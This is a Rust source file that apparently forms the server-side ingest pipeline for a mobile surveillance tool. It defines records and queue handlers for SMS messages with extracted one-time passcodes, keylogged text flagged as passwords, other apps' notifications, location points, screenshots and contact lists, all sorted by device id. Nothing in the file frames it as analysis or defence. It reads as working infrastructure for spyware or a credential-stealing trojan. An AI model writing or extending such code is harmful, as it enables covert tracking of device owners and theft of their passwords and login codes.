// [context: Rust, Linux/x64, incoming device data ingest pipeline]

use serde::{Deserialize, Serialize};
use thiserror::Error;
use tokio::sync::mpsc;
use std::time::SystemTime;

#[derive(Error, Debug)]
pub enum IngestError {
    #[error("decrypt failed")]
    DecryptFailed,
    #[error("parse error")]
    ParseError,
    #[error("queue full")]
    QueueFull,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SmsRecord {
    pub sender: String,
    pub body: String,
    pub received_at: u64,
    pub is_otp: bool,
    pub extracted_otp: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct NotifRecord {
    pub package_name: String,
    pub title: String,
    pub body: String,
    pub posted_at: u64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct KeylogEntry {
    pub app_package: String,
    pub field_type: String,
    pub content: String,
    pub is_password: bool,
    pub captured_at: u64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct LocationPoint {
    pub lat: f64,
    pub lng: f64,
    pub accuracy: f32,
    pub altitude: Option<f64>,
    pub captured_at: u64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ContactRecord {
    pub contact_id: String,
    pub name: String,
    pub phones: Vec<String>,
    pub emails: Vec<String>,
    pub organization: Option<String>,
}

#[derive(Debug)]
pub enum IngestItem {
    Sms(String, Vec<SmsRecord>),
    Notifications(String, Vec<NotifRecord>),
    Keylog(String, Vec<KeylogEntry>),
    Location(String, LocationPoint),
    Screenshot(String, Vec<u8>, u64),
    Contacts(String, Vec<ContactRecord>),
}

pub struct DataIngestor {
    tx: mpsc::UnboundedSender<IngestItem>,
}

impl DataIngestor {
    pub fn new() -> (Self, mpsc::UnboundedReceiver<IngestItem>) {
        let (tx, rx) = mpsc::unbounded_channel();
        (Self { tx }, rx)
    }

    pub fn ingest_sms(&self, device_id: &str, batch: Vec<SmsRecord>) -> Result<(), IngestError> {
        self.tx.send(IngestItem::Sms(device_id.to_string(), batch))
            .map_err(|_| IngestError::QueueFull)
    }

    pub fn ingest_notifications(&self, device_id: &str, batch: Vec<NotifRecord>) -> Result<(), IngestError> {
        self.tx.send(IngestItem::Notifications(device_id.to_string(), batch))
            .map_err(|_| IngestError::QueueFull)
    }

    pub fn ingest_keylog(&self, device_id: &str, entries: Vec<KeylogEntry>) -> Result<(), IngestError> {
        self.tx.send(IngestItem::Keylog(device_id.to_string(), entries))
            .map_err(|_| IngestError::QueueFull)
    }

    pub fn ingest_location(&self, device_id: &str, point: LocationPoint) -> Result<(), IngestError> {
        self.tx.send(IngestItem::Location(device_id.to_string(), point))
            .map_err(|_| IngestError::QueueFull)
    }

    pub fn ingest_screenshot(&self, device_id: &str, compressed_bytes: Vec<u8>) -> Result<(), IngestError> {
        let ts = SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        self.tx.send(IngestItem::Screenshot(device_id.to_string(), compressed_bytes, ts))
            .map_err(|_| IngestError::QueueFull)
    }

    pub fn ingest_contacts(&self, device_id: &str, contacts: Vec<ContactRecord>) -> Result<(), IngestError> {
        self.tx.send(IngestItem::Contacts(device_id.to_string(), contacts))
            .map_err(|_| IngestError::QueueFull)
    }
}
